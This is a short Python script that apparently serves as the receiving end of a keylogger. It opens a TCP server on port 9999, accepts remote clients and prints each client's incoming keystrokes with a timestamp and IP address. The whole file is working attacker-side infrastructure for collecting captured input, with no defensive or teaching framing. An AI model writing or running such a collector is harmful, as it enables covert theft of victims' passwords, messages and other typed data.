import socket
import datetime

# Server configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 9999       # Port to listen on

# Create a socket server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((HOST, PORT))
server_socket.listen(5)

print(f"[*] Server started on port {PORT}")
print("[*] Waiting for connections...")

try:
    while True:
        # Accept connections
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection from {client_address[0]}:{client_address[1]}")
        
        while True:
            try:
                # Receive data
                data = client_socket.recv(1024)
                if not data:
                    print(f"[-] Client {client_address[0]} disconnected")
                    break
                
                # Decode and print the keystrokes
                keystrokes = data.decode('utf-8', errors='replace')
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                print(f"[{timestamp}] Keystrokes from {client_address[0]}: {keystrokes}")
                
                # Send acknowledgment
                client_socket.send(b"ACK")
            except Exception as e:
                print(f"[-] Error: {e}")
                break
        
        client_socket.close()

except KeyboardInterrupt:
    print("\n[*] Shutting down server...")
    server_socket.close()
